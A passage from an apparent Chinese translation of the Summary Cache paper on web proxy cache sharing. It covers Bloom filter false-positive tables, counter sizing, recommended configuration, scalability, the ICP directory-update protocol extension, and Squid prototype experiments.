align="center">0.0425</td><td align="center">0.00694</td><td align="center">0.00183</td><td align="center">0.000649</td><td align="center">0.000285</td><td align="center">0.000147</td><td align="center">8.56e-05</td><td align="center">5.55e-05</td></tr><tr><td align="center">24</td><td align="center">16.6</td><td align="center">0.0408</td><td align="center">0.00639</td><td align="center">0.00162</td><td align="center">0.000555</td><td align="center">0.000235</td><td align="center">0.000117</td><td align="center">6.63e-05</td><td align="center">4.17e-05</td></tr><tr><td align="center">25</td><td align="center">17.3</td><td align="center">0.0392</td><td align="center">0.00591</td><td align="center">0.00145</td><td align="center">0.000478</td><td align="center">0.000196</td><td align="center">9.44e-05</td><td align="center">5.18e-05</td><td align="center">3.16e-05</td></tr><tr><td align="center">26</td><td align="center">18</td><td align="center">0.0377</td><td align="center">0.00548</td><td align="center">0.00129</td><td align="center">0.000413</td><td align="center">0.000164</td><td align="center">7.66e-05</td><td align="center">4.08e-05</td><td align="center">2.42e-05</td></tr><tr><td align="center">27</td><td align="center">18.7</td><td align="center">0.0364</td><td align="center">0.0051</td><td align="center">0.00116</td><td align="center">0.000359</td><td align="center">0.000138</td><td align="center">6.26e-05</td><td align="center">3.24e-05</td><td align="center">1.87e-05</td></tr><tr><td align="center">28</td><td align="center">19.4</td><td align="center">0.0351</td><td align="center">0.00475</td><td align="center">0.00105</td><td align="center">0.000314</td><td align="center">0.000117</td><td align="center">5.15e-05</td><td align="center">2.59e-05</td><td align="center">1.46e-05</td></tr><tr><td align="center">29</td><td align="center">20.1</td><td align="center">0.0339</td><td align="center">0.00444</td><td align="center">0.000949</td><td align="center">0.000276</td><td align="center">9.96e-05</td><td align="center">4.26e-05</td><td align="center">2.09e-05</td><td align="center">1.14e-05</td></tr><tr><td align="center">30</td><td align="center">20.8</td><td align="center">0.0328</td><td align="center">0.00416</td><td align="center">0.000862</td><td align="center">0.000243</td><td align="center">8.53e-05</td><td align="center">3.55e-05</td><td align="center">1.69e-05</td><td align="center">9.01e-06</td></tr><tr><td align="center">31</td><td align="center">21.5</td><td align="center">0.0317</td><td align="center">0.0039</td><td align="center">0.000785</td><td align="center">0.000215</td><td align="center">7.33e-05</td><td align="center">2.97e-05</td><td align="center">1.38e-05</td><td align="center">7.16e-06</td></tr><tr><td align="center">32</td><td align="center">22.2</td><td align="center">0.0308</td><td align="center">0.00367</td><td align="center">0.000717</td><td align="center">0.000191</td><td align="center">6.33e-05</td><td align="center">2.5e-05</td><td align="center">1.13e-05</td><td align="center">5.73e-06</td></tr></tbody></table><p><strong>表4：</strong> 在各种 $m&#x2F;n$ 和 $k$ 组合下的误判率。</p><table><thead><tr><th align="center">m&#x2F;n</th><th align="center">k</th><th align="center">k&#x3D;9</th><th align="center">k&#x3D;10</th><th align="center">k&#x3D;11</th><th align="center">k&#x3D;12</th><th align="center">k&#x3D;13</th><th align="center">k&#x3D;14</th><th align="center">k&#x3D;15</th><th align="center">k&#x3D;16</th></tr></thead><tbody><tr><td align="center">11</td><td align="center">7.62</td><td align="center">0.00531</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">12</td><td align="center">8.32</td><td align="center">0.00317</td><td align="center">0.00334</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">13</td><td align="center">9.01</td><td align="center">0.00194</td><td align="center">0.00198</td><td align="center">0.0021</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">14</td><td align="center">9.7</td><td align="center">0.00121</td><td align="center">0.0012</td><td align="center">0.00124</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">15</td><td align="center">10.4</td><td align="center">0.000775</td><td align="center">0.000744</td><td align="center">0.000747</td><td align="center">0.000778</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">16</td><td align="center">11.1</td><td align="center">0.000505</td><td align="center">0.00047</td><td align="center">0.000459</td><td align="center">0.000466</td><td align="center">0.000488</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">17</td><td align="center">11.8</td><td align="center">0.000335</td><td align="center">0.000302</td><td align="center">0.000287</td><td align="center">0.000284</td><td align="center">0.000291</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">18</td><td align="center">12.5</td><td align="center">0.000226</td><td align="center">0.000198</td><td align="center">0.000183</td><td align="center">0.000176</td><td align="center">0.000176</td><td align="center">0.000182</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">19</td><td align="center">13.2</td><td align="center">0.000155</td><td align="center">0.000132</td><td align="center">0.000118</td><td align="center">0.000111</td><td align="center">0.000109</td><td align="center">0.00011</td><td align="center">0.000114</td><td align="center"></td></tr><tr><td align="center">20</td><td align="center">13.9</td><td align="center">0.000108</td><td align="center">8.89e-05</td><td align="center">7.77e-05</td><td align="center">7.12e-05</td><td align="center">6.79e-05</td><td align="center">6.71e-05</td><td align="center">6.84e-05</td><td align="center"></td></tr><tr><td align="center">21</td><td align="center">14.6</td><td align="center">7.59e-05</td><td align="center">6.09e-05</td><td align="center">5.18e-05</td><td align="center">4.63e-05</td><td align="center">4.31e-05</td><td align="center">4.17e-05</td><td align="center">4.16e-05</td><td align="center">4.27e-05</td></tr><tr><td align="center">22</td><td align="center">15.2</td><td align="center">5.42e-05</td><td align="center">4.23e-05</td><td align="center">3.5e-05</td><td align="center">3.05e-05</td><td align="center">2.78e-05</td><td align="center">2.63e-05</td><td align="center">2.57e-05</td><td align="center">2.59e-05</td></tr><tr><td align="center">23</td><td align="center">15.9</td><td align="center">3.92e-05</td><td align="center">2.97e-05</td><td align="center">2.4e-05</td><td align="center">2.04e-05</td><td align="center">1.81e-05</td><td align="center">1.68e-05</td><td align="center">1.61e-05</td><td align="center">1.59e-05</td></tr><tr><td align="center">24</td><td align="center">16.6</td><td align="center">2.86e-05</td><td align="center">2.11e-05</td><td align="center">1.66e-05</td><td align="center">1.38e-05</td><td align="center">1.2e-05</td><td align="center">1.08e-05</td><td align="center">1.02e-05</td><td align="center">9.87e-06</td></tr><tr><td align="center">25</td><td align="center">17.3</td><td align="center">2.11e-05</td><td align="center">1.52e-05</td><td align="center">1.16e-05</td><td align="center">9.42e-06</td><td align="center">8.01e-06</td><td align="center">7.1e-06</td><td align="center">6.54e-06</td><td align="center">6.22e-06</td></tr><tr><td align="center">26</td><td align="center">18</td><td align="center">1.57e-05</td><td align="center">1.1e-05</td><td align="center">8.23e-06</td><td align="center">6.52e-06</td><td align="center">5.42e-06</td><td align="center">4.7e-06</td><td align="center">4.24e-06</td><td align="center">3.96e-06</td></tr><tr><td align="center">27</td><td align="center">18.7</td><td align="center">1.18e-05</td><td align="center">8.07e-06</td><td align="center">5.89e-06</td><td align="center">4.56e-06</td><td align="center">3.7e-06</td><td align="center">3.15e-06</td><td align="center">2.79e-06</td><td align="center">2.55e-06</td></tr><tr><td align="center">28</td><td align="center">19.4</td><td align="center">8.96e-06</td><td align="center">5.97e-06</td><td align="center">4.25e-06</td><td align="center">3.22e-06</td><td align="center">2.56e-06</td><td align="center">2.13e-06</td><td align="center">1.85e-06</td><td align="center">1.66e-06</td></tr><tr><td align="center">29</td><td align="center">20.1</td><td align="center">6.85e-06</td><td align="center">4.45e-06</td><td align="center">3.1e-06</td><td align="center">2.29e-06</td><td align="center">1.79e-06</td><td align="center">1.46e-06</td><td align="center">1.24e-06</td><td align="center">1.09e-06</td></tr><tr><td align="center">30</td><td align="center">20.8</td><td align="center">5.28e-06</td><td align="center">3.35e-06</td><td align="center">2.28e-06</td><td align="center">1.65e-06</td><td align="center">1.26e-06</td><td align="center">1.01e-06</td><td align="center">8.39e-06</td><td align="center">7.26e-06</td></tr><tr><td align="center">31</td><td align="center">21.5</td><td align="center">4.1e-06</td><td align="center">2.54e-06</td><td align="center">1.69e-06</td><td align="center">1.2e-06</td><td align="center">8.93e-07</td><td align="center">7e-07</td><td align="center">5.73e-07</td><td align="center">4.87e-07</td></tr><tr><td align="center">32</td><td align="center">22.2</td><td align="center">3.2e-06</td><td align="center">1.94e-06</td><td align="center">1.26e-06</td><td align="center">8.74e-07</td><td align="center">6.4e-07</td><td align="center">4.92e-07</td><td align="center">3.95e-07</td><td align="center">3.3e-07</td></tr></tbody></table><p><strong>表5：</strong> 在各种 m&#x2F;n 和 $k$ 组合下的误判率。</p><table><thead><tr><th align="center">m&#x2F;n</th><th align="center">k</th><th align="center">k&#x3D;17</th><th align="center">k&#x3D;18</th><th align="center">k&#x3D;19</th><th align="center">k&#x3D;20</th><th align="center">k&#x3D;21</th><th align="center">k&#x3D;22</th><th align="center">k&#x3D;23</th><th align="center">k&#x3D;24</th></tr></thead><tbody><tr><td align="center">22</td><td align="center">15.2</td><td align="center">2.67e-05</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">23</td><td align="center">15.9</td><td align="center">1.61e-05</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">24</td><td align="center">16.6</td><td align="center">9.84e-06</td><td align="center">1e-05</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">25</td><td align="center">17.3</td><td align="center">6.08e-06</td><td align="center">6.11e-06</td><td align="center">6.27e-06</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">26</td><td align="center">18</td><td align="center">3.81e-06</td><td align="center">3.76e-06</td><td align="center">3.8e-06</td><td align="center">3.92e-06</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">27</td><td align="center">18.7</td><td align="center">2.41e-06</td><td align="center">2.34e-06</td><td align="center">2.33e-06</td><td align="center">2.37e-06</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">28</td><td align="center">19.4</td><td align="center">1.54e-06</td><td align="center">1.47e-06</td><td align="center">1.44e-06</td><td align="center">1.44e-06</td><td align="center">1.48e-06</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center">29</td><td align="center">20.1</td><td align="center">9.96e-07</td><td align="center">9.35e-07</td><td align="center">9.01e-07</td><td align="center">8.89e-07</td><td align="center">8.96e-07</td><td align="center">9.21e-07</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">30</td><td align="center">20.8</td><td align="center">6.5e-07</td><td align="center">6e-07</td><td align="center">5.69e-07</td><td align="center">5.54e-07</td><td align="center">5.5e-07</td><td align="center">5.58e-07</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">31</td><td align="center">21.5</td><td align="center">4.29e-07</td><td align="center">3.89e-07</td><td align="center">3.63e-07</td><td align="center">3.48e-07</td><td align="center">3.41e-07</td><td align="center">3.41e-07</td><td align="center">3.48e-07</td><td align="center"></td></tr><tr><td align="center">32</td><td align="center">22.2</td><td align="center">2.85e-07</td><td align="center">2.55e-07</td><td align="center">2.34e-07</td><td align="center">2.21e-07</td><td align="center">2.13e-07</td><td align="center">2.1e-07</td><td align="center">2.12e-07</td><td align="center">2.17e-07</td></tr></tbody></table><p><strong>图4</strong> 中的曲线图显示了误判率与分配给每个条目的位数的关系，即比率为：  $\alpha &#x3D; n &#x2F; m $ 。上面的曲线是针对 4个哈希函数的情况。下面的曲线是散列函数的最佳数量。标度是对数的，因此观察到的直线对应于指数下降。显然，由于布隆过滤器中每个Key只有很少的存储空间，因此存在一些误报的轻微风险。例如，对于一个比Key数量大10倍的位数组，在使用4个散列函数的情况下，误报率大概为1.2％，使用5个散列函数的情况下，误报的概率为0.9％。 我们也可以通过分配更多的内存来轻松降低误报率。</p><p><img src="https://cdn.bugwz.com/summary-cache-figure-4.png" alt="图4：假阳性的概率（对数刻度）。顶部曲线用于4个哈希函数。 底部曲线是散列函数的最佳（整数）个数"></p><p>由于在我们的上下文中，每个代理都维护一个本地布隆过滤器来存储自己的缓存文档，因此集合 $A$ 必须支持修改。这是通过为位数组中的每个位置 $\tau$ 维持该位被设置为 $1$ 的次数 $c(\tau)$（即散列值为 $\tau$ 的元素的数量）的计数来完成的。所有的计数最初都为0。当我们插入或者删除键 $a$ （在我们示例的文档中为URL）的时候，计数 $c(h_1(a),h_2(a),…h_k(a))$ 相应的增加或者减少。当计数从0变为1的时候，相应的位被打开，当计数从1变为0的时候，相应的位将关闭，因此，本地的布隆过滤器始终正确反应当前目录。</p><p>由于我们还需要为计数分配内存，因此重要的是要知道它们可以变为多大。 将具有 $k$ 个散列函数的 $n$ 个密钥插入大小为 $m$ 的位数组后，估计预期最大计数为（参见[22，第72页]）</p><p>$T^{-1}{(m)}(1 + \displaystyle \frac{ln(kn&#x2F;m)}{ln T^{-1}(m)} + O(\frac{1}{ln^2 T^{-1}(m)}))$</p><p>并且任何计数大于或等于 $i$ 的概率为：</p><p>$Pr(max(c) \geq i) \leq m({^{nk}_i}){ \displaystyle \frac{1}{m^i}} \leq m({\displaystyle \frac{enk}{im}})^i$</p><p>如前所述，$k$（超过实数）的最优值为 $ln(2m&#x2F;n)$，因此假设哈希函数的数量小于 $ln(2m&#x2F;n)$ ，我们可以进一步限制：</p><p>$Pr(max(c) \geq i) \leq m({\displaystyle \frac{eln2}{i}})^i$</p><p>因此，取 $i &#x3D; 16$，我们得到：</p><p>$Pr(max(c) \geq 16) \leq 1.37 * 10^{-15} * m$</p><p>换句话说，如果我们允许使用4个比特位用于计数，则在表的初始插入过程中，实际 $m$ 值的溢出概率很小。</p><p>在实践中，我们必须考虑到哈希函数并不是真正随机的，并且我们一直在进行插入和删除操作。 不过，<strong>似乎每个计数占用4个比特位就足够了</strong>。 此外，如果计数超过 <code>15</code>，我们可以简单地将其保持在<code>15</code>；否则，它将保持不变。 在多次删除之后，这可能会导致布隆过滤器允许出现假负数（当计数不应为<code>0</code>时该计数变为<code>0</code>）的情况，但是发生此类事件的可能性非常低，以至于同时将重新启动代理服务器，并重建整个结构。</p><h3 id="布隆过滤器作为摘要"><a href="#布隆过滤器作为摘要" class="headerlink" title="布隆过滤器作为摘要"></a>布隆过滤器作为摘要</h3><p><img src="https://cdn.bugwz.com/summary-cache-figure-5.png" alt="图5：不同摘要表示形式下的总点击率"></p><p><img src="https://cdn.bugwz.com/summary-cache-figure-6.png" alt="图6：不同摘要表示下的错误命中率。 请注意，y轴为对数刻度"></p><p><img src="https://cdn.bugwz.com/summary-cache-figure-7.png" alt="图7： 不同摘要形式下每个用户请求的网络消息数。 请注意，y轴为对数刻度"></p><p><img src="https://cdn.bugwz.com/summary-cache-figure-8.png" alt="图8： 不同摘要格式下每个用户请求的网络消息字节数"></p><p><img src="https://cdn.bugwz.com/summary-cache-figure-9.png" alt="图9： 不同摘要表示形式的内存需求"></p><p>布隆过滤器提供了一种创建摘要信息的简单机制。代理从缓存文档的URL列表构建Bloom过滤器，然后将位数组以及哈希函数的规范发送给其他代理。 更新摘要信息时，代理可以指定翻转位数组中的哪些位，或发送整个数组，以较小者为准。</p><p>每个代理都维护着布隆过滤器的本地副本，并在将文档添加到缓存或从缓存中替换文档时对其进行更新。正如以上所说明的，为了更新本地的布隆过滤器，代理服务器需要维护一个计数器数组，每个计数器记住相应位设置为1的次数。并将文档添加到高速缓存中时，增加相应位的计数器； 当从缓存中删除它时，减少相应位的计数器。 当计数器从0增加到1或从1下降到0时，相应的位应该分别被设置为1或0，并在列表中添加一条记录更新的记录。</p><p>布隆过滤器的优点是，它们可以在内存需求和误报率（会导致误判命中）之间进行权衡。 因此，代理可以在代理间的通信量略有增加的情况下，为摘要信息分配较少的内存。</p><p>我们针对基于布隆过滤器的摘要信息尝试了三种配置：<strong>位数组的大小为缓存中平均文档数的8倍，16倍和32倍（该比率也称为 “加载因子”）</strong>。 通过将高速缓存大小除以<strong>8K</strong>（平均文档大小）来计算平均文档数。 所有这三种配置都使用<strong>四个哈希函数</strong>。 哈希函数的数量并不是每种配置的最佳选择，但足以证明布隆过滤器的性能。 首先通过计算URL的MD5签名[38]（产生128位），然后<strong>将128位划分为4个32位字</strong>，最后将每个32位字的模数与表大小 $m$ 进行比较。MD5是一种加密消息摘要算法，可将任意长度的字符串散列为128位[38]。我们选择它是因为其众所周知的属性和相对较快的实现。</p><p>这些摘要信息表示，<strong>精确目录方法</strong>和<strong>服务器名称方法的性能</strong>如<strong>图5</strong>到<strong>图9</strong>所示。在<strong>图5</strong>中，我们显示了<strong>总的高速缓存命中率</strong>，在<strong>图6</strong>中，我们显示了<strong>错误命中率</strong>。 请注意，<strong>图6</strong>中的y轴为对数刻度。 <strong>基于布隆过滤器的摘要实际上具有与精确目录方法相同的缓存命中率，并且在位数组较小时具有较高的假命中率</strong>。 服务器名称具有较高的错误命中率。 它具有较高的缓存命中率，可能是因为它的许多错误命中有助于避免错误遗漏。</p><p><strong>图7</strong>显示了代理间网络消息的总数，包括<strong>摘要更新的数量和查询消息的数量（包括远程高速缓存命中，错误命中和远程陈旧命中）</strong>。注意，<strong>图7</strong>中的y轴为对数刻度。为了进行比较，我们还列出了每个跟踪中<code>ICP</code>引起的消息数。假定所有消息都是单播消息。该图通过每个跟踪中的HTTP请求数将消息数标准化。基于精确目录和布隆过滤器的摘要都可以很好地执行，并且服务器名和<code>ICP</code>会生成更多消息。对于布隆过滤器，如预期的那样，需要在位阵列大小和消息数之间进行权衡。但是，一旦错误命中率足够小，错误命中就不再是代理间消息的主要来源。而是，远程缓存命中和远程陈旧命中成为主导。因此，在<code>负载因数16</code>和<code>负载因数32</code>之间在网络消息方面的差异很小。与<code>ICP</code>相比，基于布隆过滤器的摘要将消息数量减少了<code>25</code>到<code>60</code>。</p><p><strong>图8</strong>显示了代理间网络消息的估计总大小（以字节为单位）。我们估计大小是因为更新消息往往大于查询消息。<code>ICP</code>和其他方法中查询消息的平均大小均假定为<code>标头20字节</code>和<code>平均URL为50字节</code>。 精确目录和服务器名称中摘要更新的大小假定为<code>标头20字节</code>，<code>每次更改16字节</code>。 在基于布隆过滤器的摘要中，摘要更新的大小估计为32字节的标头（请参见第6节）加上每个位翻转4字节。 结果表明，<strong>就消息字节而言，基于布隆过滤器的摘要比ICP改善了55％至64％</strong>。 换句话说，摘要缓存偶尔使用大消息突发，以避免连续发送小消息。 查看<strong>表2、6和7</strong>中的CPU开销和网络接口数据包（其中SC-ICP代表摘要缓存方法），我们可以看到这是一个很好的权衡。</p><p>最后，<strong>图9</strong>显示了摘要缓存方法的每个代理的内存，以缓存大小的百分比表示。 三种布隆过滤器配置所消耗的内存比精确目录少得多，但在所有其他方面的性能却与精确目录类似。 负载因数为8时，布隆过滤器摘要与服务器名称方法具有相似或更少的内存要求，并且错误命中率和网络消息更少。 由于<code>DEC</code>，<code>UCB</code>，<code>UPisa</code>，<code>NLANR</code>和<code>Questnet</code>迹线<code>分别具有16、8、8、4和12个代理</code>，因此该图表明内存需求随代理的数量线性增长。</p><p>考虑所有结果，我们看到布隆过滤器的摘要在低网络开销和低内存需求方面提供了最佳性能。 这种方法简单易行。 除MD5之外，其他更快的哈希方法也可用，例如哈希函数可以基于Rabin指纹方法（参见[42]，[7]）中的多项式算法或简单的哈希函数（例如[22]，p. [48]）可用于生成例如32位，并且可以通过对这32位（视为整数）进行随机线性变换来获得其他位。 缺点是这些较快的功能是有效可逆的（也就是说，可以轻松地构建散列到特定位置的URL），这一事实可能被恶意用户用于邪恶目的。</p><h3 id="推荐配置"><a href="#推荐配置" class="headerlink" title="推荐配置"></a>推荐配置</h3><p>结合以上结果，我们建议对摘要缓存方法进行以下配置。<strong>更新阈值应在1％到10％之间，以避免显着降低总缓存命中率</strong>。如果<strong>选择了基于时间的更新方法，则应选择时间间隔，以使新文档的百分比在1％到10％之间</strong>。代理可以广播更改（如果较小，则广播整个位数组），或者让其他代理从中获取更新。摘要应采用布隆过滤器的形式。<strong>8到16之间的负载系数可以很好地工作，但是代理可以根据其内存和网络流量问题降低或提高它</strong>。<strong>基于负载因子，应使用四个或更多哈希函数</strong>。此处和[16]中提供的数据可以用作决策参考。<strong>对于散列函数，我们建议从URL的128位MD5签名中获取不相交的位组</strong>。如果需要更多位，则可以计算与其自身连接的URL的MD5签名。实际上，与缓存文档所引起的用户和系统CPU开销相比，MD5的计算开销可以忽略不计（请参阅第[7]节）。</p><h3 id="可扩展性"><a href="#可扩展性" class="headerlink" title="可扩展性"></a>可扩展性</h3><p>尽管我们的模拟是针对<code>4</code>到<code>16</code>个代理完成的，但是我们可以轻松地推断出结果。例如，假设每个代理有<code>8GB的缓存</code>要合作。每个代理平均存储约<code>100万个网页</code>。表示<code>1M页面</code>所需的布隆过滤器内存在<code>负载因子16时为2MB</code>。每个代理大约需要<code>200MB</code>来表示所有摘要，另外需要<code>1MB</code>来表示自己的计数器。代理间消息包括更新消息，错误命中，远程缓存命中和远程陈旧命中。 <strong>1％的阈值对应于更新之间的10K请求，每个更新包含99条消息，每个请求的更新消息数小于0.01</strong>。<strong>带有10个哈希函数的16的负载因子的假命中率约为4.7％（每个摘要的误报率小于0.00047，但其中有100个摘要）</strong>。因此，不计算远程缓存命中和远程陈旧命中（在代理数量上相对稳定）引入的消息，协议引入的开销是每个请求100个代理的0.06条消息以下。在这些消息中，只有更新消息很大，大约数百KB。幸运的是，更新消息可以通过不可靠的多播方案进行传输。我们的仿真预测，在保持较低开销的同时，与ICP的理论命中率相比，该方案将总命中率降低了不到2％。</p><p>尽管没有迹线足够大以至于无法对100个代理进行有意义的仿真，但我们已经使用大量代理进行了仿真，结果验证了这些&#96;&#96;封底’’的计算结果。 因此，我们相信摘要缓存可以很好地扩展。</p><h2 id="摘要缓存增强型ICP的实现"><a href="#摘要缓存增强型ICP的实现" class="headerlink" title="摘要缓存增强型ICP的实现"></a>摘要缓存增强型ICP的实现</h2><p>基于仿真结果，我们提出以下摘要缓存增强的Internet缓存协议作为ICP的优化。 该协议已在<code>Squid 1.1.14</code>之上的原型中实现，并且该原型可公开获得[15]。 在<code>Squid 1.2b20</code>中也实现了我们的方法的一种称为<code>Cache Digest的变体</code>[44]。</p><h3 id="协议书"><a href="#协议书" class="headerlink" title="协议书"></a>协议书</h3><p>我们协议的设计面向较小的延迟阈值。 因此，它假定摘要是通过发送差异来更新的。 如果延迟阈值很大，则发送整个位阵列会更经济； <code>Squid 1.2b20</code> [44]中的<code>Cache Digest原型</code>采用了这种方法。</p><p>我们在ICP版本2[48]中添加了新的操作码，<code>ICP_OP_DIRUPDATE（= 20）</code>，代表目录更新消息。 在更新消息中，常规ICP头后面有一个附加头，该头包括：<code>16位的Function_Num</code>，<code>16位的Function_Bits</code>，<code>32位的BitArray_Size_InBits</code>和<code>32位的Number_of_Updates</code>。 标头完全指定用于探测过滤器的哈希函数。 有散列函数的Function_Num。 通过首先从URL的MD5签名[38,22]中取出位0到M-1，M到2M-1、2M到3M-1等来计算函数，其中M是Function_Bits，然后进行模块化 位由BitArray_Size_InBits决定。 如果128位不够用，则通过计算与其自身连接的URL的MD5签名来生成更多位。</p><p>标头后跟一个32位整数列表。 整数中的最高有效位指定该位应设置为<code>0</code>还是<code>1</code>，其余位指定需要更改的位的索引。 该设计是出于以下考虑：如果消息仅指定应翻转的位，则丢失先前的更新消息将具有级联效应。 该设计使消息可以通过不可靠的多播协议发送。 此外，每个更新消息都带有标头，该标头指定哈希函数，以便接收者可以验证信息。 该设计将哈希表的大小限制为小于20亿，这暂时足够大。</p><h3 id="原型实现"><a href="#原型实现" class="headerlink" title="原型实现"></a>原型实现</h3><p>我们修改了<code>Squid 1.1.4</code>软件以实现上述协议。 一个额外的位数组被添加到每个邻居的数据结构中。 当从邻居接收到第一摘要更新消息时，初始化该结构。 代理还分配了一个字节计数器数组来维护Bloom过滤器的本地副本，并分配一个整数数组来记住过滤器的更改。</p><p>由于<code>ICP</code>是基于<code>UDP</code>构建的，因此当前的原型通过UDP发送更新消息。 该设计的一种变体是通过TCP或多播发送消息。 由于这些消息的大小，最好通过<code>TCP</code>或多播发送它们。 此外，由于协作代理的收集是相对静态的，因此代理可以仅保持彼此之间的永久<code>TCP</code>连接以交换更新消息。 不幸的是，在<code>Squid</code>中实现<code>ICP</code>仅在<code>UDP</code>之上。 因此，原型有悖于5.5节中的建议，并且只要有足够的更改来填充IP数据包，就发送更新。 该实现还利用<code>Squid</code>的内置支持来检测邻居代理的故障和恢复，并在故障邻居恢复时重新初始化它。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>表6：实验2中UPisa迹线的ICP和摘要缓存的性能。括号中的数字表示三个实验之间测量值的差异。</p><table><thead><tr><th>Exp</th><th>Hit Ratio</th><th>Client Latency</th><th>User CPU</th><th>System CPU</th><th>UDP Traffic</th><th>TCP Traffic</th><th>Total Packets</th></tr></thead><tbody><tr><td>no ICP</td><td>16.94</td><td>6.22(0.4%)</td><td>81.72(0.1%)</td><td>115.63(0.1%)</td><td>4718(1%)</td><td>242K(0.1%)</td><td>259K(0.1%)</td></tr><tr><td>ICP</td><td>19.3</td><td>6.31(0.5%)</td><td>116.81(0.1%)</td><td>137.12(0.1%)</td><td>72761(0%)</td><td>245K(0.1%)</td><td>325K(0.2%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>1.42%</td><td>43%</td><td>19%</td><td>1400%</td><td>1%</td><td>25%</td></tr><tr><td>SC-ICP</td><td>19.0</td><td>6.07 (0.1%)</td><td>91.53(0.4%)</td><td>121.75(0.5%)</td><td>5765(2%)</td><td>244K(0.1%)</td><td>262K(0.1%)</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>-2.4%</td><td>12%</td><td>5%</td><td>22%</td><td>1%</td><td>1%</td></tr></tbody></table><p>表7：实验3中UPisa跟踪的ICP和摘要缓存的性能</p><table><thead><tr><th>Exp</th><th>Hit Ratio</th><th>Client Latency</th><th>User CPU</th><th>System CPU</th><th>UDP Traffic</th><th>TCP Traffic</th><th>Total Packets</th></tr></thead><tbody><tr><td>no ICP</td><td>9.94</td><td>7.11</td><td>81.75</td><td>119.7</td><td>1608</td><td>248K</td><td>265K</td></tr><tr><td>ICP</td><td>17.9</td><td>7.22</td><td>121.5</td><td>146.4</td><td>75226</td><td>257K</td><td>343K</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>1.6%</td><td>49%</td><td>22%</td><td>4577%</td><td>3.7%</td><td>29%</td></tr><tr><td>SC-ICP</td><td>16.2</td><td>6.80</td><td>90.4</td><td>126.5</td><td>4144</td><td>254K</td><td>274K</td></tr><tr><td><strong>Overhead</strong></td><td></td><td>-4.3%</td><td>11%</td><td>5.7%</td><td>1.6</td><td>2.4%</td><td>3.2%</td></tr></tbody></table><p>我们对该原型进行了三个实验。 第一个实验重复第4节中的测试，结果包含在第4节<strong>表2</strong>中，标题为<code>SC-ICP</code>。改进的协议将UDP流量减少了50倍，并且具有网络流量， CPU时间和客户端等待时间与No-ICP相似。</p><p>我们的第二个实验和第三个实验重播了UPisa跟踪中的前24,000个请求。我们使用在4个工作站上运行的80个客户端进程的集合，并将同一工作站上的客户端进程连接到同一代理服务器。在第二个实验中，我们通过让每个客户端进程通过发出它们的Web请求来模拟一组真实的客户端来重播跟踪。在第三个实验中，我们通过让客户端进程从跟踪文件循环发出请求来重播跟踪，而不管每个请求来自哪个实际客户端。第二个实验保留了客户端及其请求之间的边界，并且客户端的请求都转到同一个代理。但是，它不会保留来自不同客户端的请求之间的顺序。第三个实验不保留请求和客户端之间的边界，但是保留请求之间的时序顺序。与第二个实验相比，第三个实验中的代理负载均衡性更高。</p><p>在这两个实验中，每个请求的URL都在跟踪文件中包含请求的大小，并且服务器以指定的字节数进行答复。 其余配置与第4节中的实验相似。与综合基准不同，该跟踪包含大量的远程命中。 实验2的结果列在表6中，实验3的结果列在<strong>表7</strong>中。</p><p>结果表明，增强的ICP协议可显着减少网络流量和CPU开销，而仅略微降低总命中率。 与No-ICP相比，增强的ICP协议可以稍微降低客户端等待时间，即使它将CPU时间增加了大约12％。 客户端延迟的减少归因于远程缓存命中。 单独的实验表明，大多数CPU时间增加是由于服务于远程命中，而MD5计算导致的CPU时间增加不到5％。 尽管实验没有如实地重播跟踪，但它们确实说明了摘要缓存在实践中的性能。</p><p>我们的结果表明，摘要缓存增强的ICP解决了ICP的开销问题，需要最小的更改，并且可以在广域网上共享可伸缩的Web缓存。</p><h2 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h2><p>Web缓存是一个活跃的研究领域。 关于Web客户端访问特性[10,3,14,33,23]，Web缓存算法[49,35,8]以及Web缓存一致性[28,31,34,13]已有许多研究。 我们的研究不涉及缓存算法或缓存一致性维护，但是在我们对Web缓存共享的好处进行调查的过程中，与某些客户端流量研究重叠。</p><p>最近，文献中提出了许多新的缓存共享方法。缓存阵列路由协议[46]在一组松散耦合的代理服务器之间划分URL空间，并让每个代理仅缓存URL哈希到其上的文档。该方法的优点在于，它消除了文档的重复副本。但是，尚不清楚该方法在代理分布在区域网络中的广域缓存共享方面的性能如何。 Relais项目[27]还建议使用本地目录在其他缓存中查找文档，并异步更新目录。这个想法类似于摘要缓存。但是，该项目似乎并未解决内存需求问题。从Relais的出版物中我们可以找到并阅读[4]，我们也不清楚该项目是否解决了目录更新频率的问题。由紧密耦合的群集工作站构建的代理也使用各种哈希和分区方法来利用群集中的内存和磁盘[20]，但是这些方法不适用于广域网。</p><p>我们的研究部分受到名为目录服务器[21]的现有提议的推动。 该方法使用中央服务器来跟踪所有代理的缓存目录，并且所有代理向服务器查询其他代理中的缓存命中。 该方法的缺点是中央服务器很容易成为瓶颈。 